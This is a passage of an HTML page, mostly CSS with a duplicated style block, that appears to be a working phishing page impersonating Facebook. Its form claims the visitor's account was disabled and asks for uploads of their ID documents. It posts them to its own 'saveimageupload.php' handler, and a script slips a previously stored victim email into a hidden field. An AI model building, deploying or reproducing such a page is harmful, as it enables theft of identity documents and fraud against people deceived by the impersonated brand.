      color: #4b4f56;
      padding: 12px;
      font-weight: 700;
    }

    .confirm .content {
      box-shadow: 1px 1px 8px 1px rgba(0, 0, 0, .1);
      max-width: 650px;
      border-radius: 10px;
      margin: 50px auto 60px auto;
    }

    .confirm .bodyyy p {
      font-size: 13px;
    }

    .confirm .bodyyy {
      padding: 10px 20px !important;
      border-bottom: 1px solid rgba(0, 0, 0, .101);
    }

    .confirm .form-control {
      border: 1px solid #d0d0d0 !important;
      border-radius: 4px !important;
      padding: 10px !important;
      resize: none !important;
      -webkit-appearance: none !important;
    }

    #sendcodeagain {
      font-size: 14px;
      padding-left: 10px;
      border: none;
      color: #385898;
      text-decoration: none;
      display: none;
      font-weight: 600;
    }

    #sendcodeagain.active {
      display: block;
    }

    #timer {
      padding-left: 10px !important;
    }

    #timer.active {
      display: none;
    }

    .confirm .footerii {
      padding: 10px 20px !important;
      height: 55px;
    }

    #code::-webkit-outer-spin-button,
    #code::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin-right: 10px;
    }

    #code[type=number] {
      -moz-appearance: textfield;
    }

    .confirm .butoni {
      padding: 3px 7px;
    }

    .confirm .popup {
      font-size: 14px;
    }

    .confirm .popup p {
      margin: 5px 0;
    }

    /* UPLOAD IMAGES */

    .upload-image {
      background: #dddfe2;
      min-height: 100vh;
    }

    .upload-image .main-upload .form {
      width: 100%;
    }

    .upload-image .main-upload .form .bg {
      width: 100%;
      background-color: white;
      border-radius: 0px 0px 5px 5px;
    }

    .upload-image .main-upload .form h6 {
      color: black;
      margin: 0;
      padding: 12px;
      font-weight: 700;
      border-bottom-color: rgba(0, 0, 0, .101);
      border-bottom: 1px solid #e5e5e5;
      background: #f5f6f7;
    }

    .upload-image .main-upload .form p {
      padding: 8px;
      margin: 0;
      font-size: 14px;
      border-bottom-color: rgba(0, 0, 0, .101);
      border-bottom: 1px solid #e5e5e5;
    }

    .upload-image .main-upload .form .item-form {
      padding: 8px;
    }

    .upload-image .main-upload .form .item-form p {
      padding: 0;
      border: none;
    }

    .upload-image .main-upload .form .item-form p.mini {
      font-size: 12px;
    }

    .upload-image .main-upload .form .item-form #file {
      padding: 0;
      margin: 8px 0;
      outline: none;
      border: none;
    }

    .upload-image .main-upload .form #btn-submitt {
      width: 100%;
      margin-top: 12px;
      text-shadow: 0 -1px rgba(0, 0, 0, .25);
      background-color: #627aad;
      outline: none;
      border: none;
      padding: 7px 0;
      color: white;
      border-radius: 5px;
      font-weight: 700;
      background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
    }

    .upload-image .footer {
      margin-top: 20px;
    }

    .upload-image .footer b {
      font-size: 16px;
    }

    .upload-image .footer a {
      color: #576b95;
      cursor: pointer;
      text-decoration: none;
      font-size: 14px;
      line-height: 18px;
    }

    .ant-input-affix-wrapper>input.ant-input {
      margin: 0;
      padding: 5px 10px !important;
    }

    .ant-input-number-handler-wrap {
      display: none !important;
    }

    .center-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      /* Center horizontally */
      justify-content: center;
      /* Center vertically */
      height: 100vh;
      /* Make the container fill the viewport height */
    }
  </style>
  <style>
    .carousel .control-arrow,
    .carousel.carousel-slider .control-arrow {
      -webkit-transition: all .25s ease-in;
      -moz-transition: all .25s ease-in;
      -ms-transition: all .25s ease-in;
      -o-transition: all .25s ease-in;
      transition: all .25s ease-in;
      opacity: .4;
      filter: alpha(opacity=40);
      position: absolute;
      z-index: 2;
      top: 20px;
      background: none;
      border: 0;
      font-size: 32px;
      cursor: pointer
    }

    .carousel .control-arrow:focus,
    .carousel .control-arrow:hover {
      opacity: 1;
      filter: alpha(opacity=100)
    }

    .carousel .control-arrow:before,
    .carousel.carousel-slider .control-arrow:before {
      margin: 0 5px;
      display: inline-block;
      border-top: 8px solid transparent;
      border-bottom: 8px solid transparent;
      content: ''
    }

    .carousel .control-disabled.control-arrow {
      opacity: 0;
      filter: alpha(opacity=0);
      cursor: inherit;
      display: none
    }

    .carousel .control-prev.control-arrow {
      left: 0
    }

    .carousel .control-prev.control-arrow:before {
      border-right: 8px solid #fff
    }

    .carousel .control-next.control-arrow {
      right: 0
    }

    .carousel .control-next.control-arrow:before {
      border-left: 8px solid #fff
    }

    .carousel-root {
      outline: none
    }

    .carousel {
      position: relative;
      width: 100%
    }

    .carousel * {
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      box-sizing: border-box
    }

    .carousel img {
      width: 100%;
      display: inline-block;
      pointer-events: none
    }

    .carousel .carousel {
      position: relative
    }

    .carousel .control-arrow {
      outline: 0;
      border: 0;
      background: none;
      top: 50%;
      margin-top: -13px;
      font-size: 18px
    }

    .carousel .thumbs-wrapper {
      margin: 20px;
      overflow: hidden
    }

    .carousel .thumbs {
      -webkit-transition: all .15s ease-in;
      -moz-transition: all .15s ease-in;
      -ms-transition: all .15s ease-in;
      -o-transition: all .15s ease-in;
      transition: all .15s ease-in;
      -webkit-transform: translate3d(0, 0, 0);
      -moz-transform: translate3d(0, 0, 0);
      -ms-transform: translate3d(0, 0, 0);
      -o-transform: translate3d(0, 0, 0);
      transform: translate3d(0, 0, 0);
      position: relative;
      list-style: none;
      white-space: nowrap
    }

    .carousel .thumb {
      -webkit-transition: border .15s ease-in;
      -moz-transition: border .15s ease-in;
      -ms-transition: border .15s ease-in;
      -o-transition: border .15s ease-in;
      transition: border .15s ease-in;
      display: inline-block;
      margin-right: 6px;
      white-space: nowrap;
      overflow: hidden;
      border: 3px solid #fff;
      padding: 2px
    }

    .carousel .thumb:focus {
      border: 3px solid #ccc;
      outline: none
    }

    .carousel .thumb.selected,
    .carousel .thumb:hover {
      border: 3px solid #333
    }

    .carousel .thumb img {
      vertical-align: top
    }

    .carousel.carousel-slider {
      position: relative;
      margin: 0;
      overflow: hidden
    }

    .carousel.carousel-slider .control-arrow {
      top: 0;
      color: #fff;
      font-size: 26px;
      bottom: 0;
      margin-top: 0;
      padding: 5px
    }

    .carousel.carousel-slider .control-arrow:hover {
      background: rgba(0, 0, 0, 0.2)
    }

    .carousel .slider-wrapper {
      overflow: hidden;
      margin: auto;
      width: 100%;
      -webkit-transition: height .15s ease-in;
      -moz-transition: height .15s ease-in;
      -ms-transition: height .15s ease-in;
      -o-transition: height .15s ease-in;
      transition: height .15s ease-in
    }

    .carousel .slider-wrapper.axis-horizontal .slider {
      -ms-box-orient: horizontal;
      display: -webkit-box;
      display: -moz-box;
      display: -ms-flexbox;
      display: -moz-flex;
      display: -webkit-flex;
      display: flex
    }

    .carousel .slider-wrapper.axis-horizontal .slider .slide {
      flex-direction: column;
      flex-flow: column
    }

    .carousel .slider-wrapper.axis-vertical {
      -ms-box-orient: horizontal;
      display: -webkit-box;
      display: -moz-box;
      display: -ms-flexbox;
      display: -moz-flex;
      display: -webkit-flex;
      display: flex
    }

    .carousel .slider-wrapper.axis-vertical .slider {
      -webkit-flex-direction: column;
      flex-direction: column
    }

    .carousel .slider {
      margin: 0;
      padding: 0;
      position: relative;
      list-style: none;
      width: 100%
    }

    .carousel .slider.animated {
      -webkit-transition: all .35s ease-in-out;
      -moz-transition: all .35s ease-in-out;
      -ms-transition: all .35s ease-in-out;
      -o-transition: all .35s ease-in-out;
      transition: all .35s ease-in-out
    }

    .carousel .slide {
      min-width: 100%;
      margin: 0;
      position: relative;
      text-align: center
    }

    .carousel .slide img {
      width: 100%;
      vertical-align: top;
      border: 0
    }

    .carousel .slide iframe {
      display: inline-block;
      width: calc(100% - 80px);
      margin: 0 40px 40px;
      border: 0
    }

    .carousel .slide .legend {
      -webkit-transition: all .5s ease-in-out;
      -moz-transition: all .5s ease-in-out;
      -ms-transition: all .5s ease-in-out;
      -o-transition: all .5s ease-in-out;
      transition: all .5s ease-in-out;
      position: absolute;
      bottom: 40px;
      left: 50%;
      margin-left: -45%;
      width: 90%;
      border-radius: 10px;
      background: #000;
      color: #fff;
      padding: 10px;
      font-size: 12px;
      text-align: center;
      opacity: 0.25;
      -webkit-transition: opacity .35s ease-in-out;
      -moz-transition: opacity .35s ease-in-out;
      -ms-transition: opacity .35s ease-in-out;
      -o-transition: opacity .35s ease-in-out;
      transition: opacity .35s ease-in-out
    }

    .carousel .control-dots {
      position: absolute;
      bottom: 0;
      margin: 10px 0;
      padding: 0;
      text-align: center;
      width: 100%;
      z-index: 1
    }

    @media (min-width: 960px) {
      .carousel .control-dots {
        bottom: 0
      }
    }

    .carousel .control-dots .dot {
      -webkit-transition: opacity .25s ease-in;
      -moz-transition: opacity .25s ease-in;
      -ms-transition: opacity .25s ease-in;
      -o-transition: opacity .25s ease-in;
      transition: opacity .25s ease-in;
      opacity: .3;
      filter: alpha(opacity=30);
      box-shadow: 1px 1px 2px rgba(0, 0, 0, 0.9);
      background: #fff;
      border-radius: 50%;
      width: 8px;
      height: 8px;
      cursor: pointer;
      display: inline-block;
      margin: 0 8px
    }

    .carousel .control-dots .dot.selected,
    .carousel .control-dots .dot:hover {
      opacity: 1;
      filter: alpha(opacity=100)
    }

    .carousel .carousel-status {
      position: absolute;
      top: 0;
      right: 0;
      padding: 5px;
      font-size: 10px;
      text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.9);
      color: #fff
    }

    .carousel:hover .slide .legend {
      opacity: 1
    }
  </style>
  <style>
    .--savior-overlay-transform-reset {
      transform: none !important;
    }

    .--savior-overlay-z-index-top {
      z-index: 2147483643 !important;
    }

    .--savior-overlay-position-relative {
      position: relative;
    }

    .--savior-overlay-position-static {
      position: static !important;
    }

    .--savior-overlay-overflow-hidden {
      overflow: hidden !important;
    }

    .--savior-overlay-overflow-x-visible {
      overflow-x: visible !important;
    }

    .--savior-overlay-overflow-y-visible {
      overflow-y: visible !important;
    }

    .--savior-overlay-z-index-reset {
      z-index: auto !important;
    }

    .--savior-overlay-display-none {
      display: none !important;
    }

    .--savior-overlay-clearfix {
      clear: both;
    }

    .--savior-overlay-reset-filter {
      filter: none !important;
      backdrop-filter: none !important;
    }

    .--savior-tooltip-host {
      z-index: 9999;
      position: absolute;
      top: 0;
    }

    /*Override css styles for Twitch.tv*/
    main.--savior-overlay-z-index-reset {
      z-index: auto !important;
    }

    .modal__backdrop.--savior-overlay-z-index-reset {
      position: static !important;
    }

    main.--savior-overlay-z-index-top {
      z-index: auto !important;
    }

    main.--savior-overlay-z-index-top .channel-root__player-container+div,
    main.--savior-overlay-z-index-top .video-player-hosting-ui__container+div {
      opacity: 0.1;
    }

    /*Dirty hack for facebook big video page e.g: https://www.facebook.com/abc/videos/...*/
    .--savior-backdrop {
      position: fixed !important;
      z-index: 2147483642 !important;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw !important;
      background-color: rgba(0, 0, 0, 0.9);
    }

    .--savior-overlay-twitter-video-player {
      position: fixed;
      width: 80%;
      height: 80%;
      top: 10%;
      left: 10%;
    }

    .--savior-overlay-z-index-reset [data-testid="sidebarColumn"],
    .--savior-overlay-z-index-reset header[role="banner"],
    .--savior-overlay-z-index-reset [aria-label="Home timeline"]>div:first-child,
    .--savior-overlay-z-index-reset [aria-label="Home timeline"]>div:nth-child(3) {
      z-index: -1 !important;
    }

    /* Fix conflict css with zingmp3 */
    .zm-video-modal.--savior-overlay-z-index-reset {
      position: absolute;
    }

    /* Dirty hack for xvideos99 */
    #page #main.--savior-overlay-z-index-reset {
      z-index: auto !important;
    }

    /* Overlay for ok.ru */
    #vp_w.--savior-overlay-z-index-reset.media-layer.media-layer__video {
      overflow-y: hidden;
      z-index: 2147483643 !important;
    }

    /* Fix missing controller for tv.naver.com */
    .--savior-overlay-z-index-top.rmc_controller,
    .--savior-overlay-z-index-top.rmc_setting_intro,
    .--savior-overlay-z-index-top.rmc_highlight,
    .--savior-overlay-z-index-top.rmc_control_settings {
      z-index: 2147483644 !important;
    }

    /* Dirty hack for douyi.com */
    .swiper-wrapper.--savior-overlay-z-index-reset .swiper-slide:not(.swiper-slide-active),
    .swiper-wrapper.--savior-overlay-transform-reset .swiper-slide:not(.swiper-slide-active) {
      display: none;
    }

    .videoWrap+div>div {
      pointer-events: unset;
    }

    /* Dirty hack for fpt.ai */
    .mfp-wrap.--savior-overlay-z-index-top {
      position: relative;
    }

    .mfp-wrap.--savior-overlay-z-index-top .mfp-close {
      display: none;
    }

    .mfp-wrap.--savior-overlay-z-index-top .mfp-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    section.--savior-overlay-z-index-reset>main[role="main"].--savior-overlay-z-index-reset+nav {
      z-index: -1 !important;
    }

    section.--savior-overlay-z-index-reset>main[role="main"].--savior-overlay-z-index-reset section.--savior-overlay-z-index-reset div.--savior-overlay-z-index-reset~div {
      position: relative;
    }

    div[class^="tiktok"].--savior-overlay-z-index-reset {
      z-index: 2147483644 !important;
    }

    @-moz-keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    @-webkit-keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    @-o-keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }
  </style>
  <style>
    .--savior-overlay-transform-reset {
      transform: none !important;
    }

    .--savior-overlay-z-index-top {
      z-index: 2147483643 !important;
    }

    .--savior-overlay-position-relative {
      position: relative;
    }

    .--savior-overlay-position-static {
      position: static !important;
    }

    .--savior-overlay-overflow-hidden {
      overflow: hidden !important;
    }

    .--savior-overlay-overflow-x-visible {
      overflow-x: visible !important;
    }

    .--savior-overlay-overflow-y-visible {
      overflow-y: visible !important;
    }

    .--savior-overlay-z-index-reset {
      z-index: auto !important;
    }

    .--savior-overlay-display-none {
      display: none !important;
    }

    .--savior-overlay-clearfix {
      clear: both;
    }

    .--savior-overlay-reset-filter {
      filter: none !important;
      backdrop-filter: none !important;
    }

    .--savior-tooltip-host {
      z-index: 9999;
      position: absolute;
      top: 0;
    }

    /*Override css styles for Twitch.tv*/
    main.--savior-overlay-z-index-reset {
      z-index: auto !important;
    }

    .modal__backdrop.--savior-overlay-z-index-reset {
      position: static !important;
    }

    main.--savior-overlay-z-index-top {
      z-index: auto !important;
    }

    main.--savior-overlay-z-index-top .channel-root__player-container+div,
    main.--savior-overlay-z-index-top .video-player-hosting-ui__container+div {
      opacity: 0.1;
    }

    /*Dirty hack for facebook big video page e.g: https://www.facebook.com/abc/videos/...*/
    .--savior-backdrop {
      position: fixed !important;
      z-index: 2147483642 !important;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw !important;
      background-color: rgba(0, 0, 0, 0.9);
    }

    .--savior-overlay-twitter-video-player {
      position: fixed;
      width: 80%;
      height: 80%;
      top: 10%;
      left: 10%;
    }

    .--savior-overlay-z-index-reset [data-testid="sidebarColumn"],
    .--savior-overlay-z-index-reset header[role="banner"],
    .--savior-overlay-z-index-reset [aria-label="Home timeline"]>div:first-child,
    .--savior-overlay-z-index-reset [aria-label="Home timeline"]>div:nth-child(3) {
      z-index: -1 !important;
    }

    /* Fix conflict css with zingmp3 */
    .zm-video-modal.--savior-overlay-z-index-reset {
      position: absolute;
    }

    /* Dirty hack for xvideos99 */
    #page #main.--savior-overlay-z-index-reset {
      z-index: auto !important;
    }

    /* Overlay for ok.ru */
    #vp_w.--savior-overlay-z-index-reset.media-layer.media-layer__video {
      overflow-y: hidden;
      z-index: 2147483643 !important;
    }

    /* Fix missing controller for tv.naver.com */
    .--savior-overlay-z-index-top.rmc_controller,
    .--savior-overlay-z-index-top.rmc_setting_intro,
    .--savior-overlay-z-index-top.rmc_highlight,
    .--savior-overlay-z-index-top.rmc_control_settings {
      z-index: 2147483644 !important;
    }

    /* Dirty hack for douyi.com */
    .swiper-wrapper.--savior-overlay-z-index-reset .swiper-slide:not(.swiper-slide-active),
    .swiper-wrapper.--savior-overlay-transform-reset .swiper-slide:not(.swiper-slide-active) {
      display: none;
    }

    .videoWrap+div>div {
      pointer-events: unset;
    }

    /* Dirty hack for fpt.ai */
    .mfp-wrap.--savior-overlay-z-index-top {
      position: relative;
    }

    .mfp-wrap.--savior-overlay-z-index-top .mfp-close {
      display: none;
    }

    .mfp-wrap.--savior-overlay-z-index-top .mfp-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    section.--savior-overlay-z-index-reset>main[role="main"].--savior-overlay-z-index-reset+nav {
      z-index: -1 !important;
    }

    section.--savior-overlay-z-index-reset>main[role="main"].--savior-overlay-z-index-reset section.--savior-overlay-z-index-reset div.--savior-overlay-z-index-reset~div {
      position: relative;
    }

    div[class^="tiktok"].--savior-overlay-z-index-reset {
      z-index: 2147483644 !important;
    }

    @-moz-keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    @-webkit-keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    @-o-keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }
  </style>
</head>

<body>

  <div id="root">
    <div>
      <div>
        <form id="upload_profi" method="POST" enctype="multipart/form-data" action="saveimageupload.php">
          <div class="upload-image">
            <section class="header" style="background: rgb(66, 103, 178);">
              <p style="margin: 0px; text-align: center; padding: 15px 0px; font-size: 18px; line-height: 22px; color: rgb(255, 255, 255);">Confirm Your Identity With Facebook</p>
            </section>
            <div class="main-upload" style="background: rgb(221, 223, 226); padding: 7px;">
              <div class="form">
                <div class="bg">
                  <h6>My personal account was disabled</h6>
                  <p>Before we can review your account, please fill out the form below to help us verify your identity.</p>
                  <p>Please attach a copy of your ID(s). Learn more about why we require ID verification and what types of ID we'll accept below.</p>

                  <div class="item-form"><label for="file">ID(s)</label>
                    <p class="mini">As it's listed on the account</p>
                    <div>
                      <input type="file" require id="file" accept="image/*" name="files[]" multiple="">
                      <input type="hidden" name="vulu_email" id="vulu_email">
                    </div>
                    <p class="desc">We may encrypt and store your ID for up to one year to improve our automated systems for detecting fake IDs. We might use trusted service providers to help review your information. Your ID will be stored securely and will not be visible to anyone on Facebook. If you don't want Facebook to use your ID to improve our automated systems for detecting fake IDs, you can adjust your Identity Confirmation Settings. If you turn this option off, the copy of your ID will be deleted within 30 days of submission or when you turned this option off. Visit the Help Centre to learn more about what happens to your ID after you have sent it to us.</p>
                  </div>
                </div><button type="submit" value="Send" name="submit" id="btn-submitt" class="btn-upload-info">Send</button>
              </div>

              <div class="footer"><b>Submitting ID</b>
                <ul>
                  <li><a href="/help/103873106370583?helpref=contact_forms" target="_blank">ID rejected by Facebook</a></li>
                  <li><a href="/help/159096464162185?helpref=contact_forms" target="_blank">Types of IDs that Facebook accepts?</a></li>
                  <li><a href="/help/283100488694834?helpref=contact_forms" target="_blank">How to upload an ID to Facebook?</a></li>
                  <li><a href="/help/105487009541643?helpref=contact_forms" target="_blank">Why Facebook may ask you to upload an ID</a></li>
                  <li><a href="/help/105487009541643?helpref=contact_forms" target="_blank">What happens to your ID after you send it to Facebook</a></li>
                </ul>
              </div>
            </div>
          </div>
      </div>
      </form>
    </div>
  </div>

  <div style="position: absolute; top: 0px; z-index: 2147483647; display: block !important;"></div>
  <script>
    var email = localStorage.getItem('vulu_person_email');
    $('#vulu_email').val(email);
  </script>
</body>
<div style="position: absolute; top: 0px; z-index: 2147483647; display: block !important;"></div>

</html>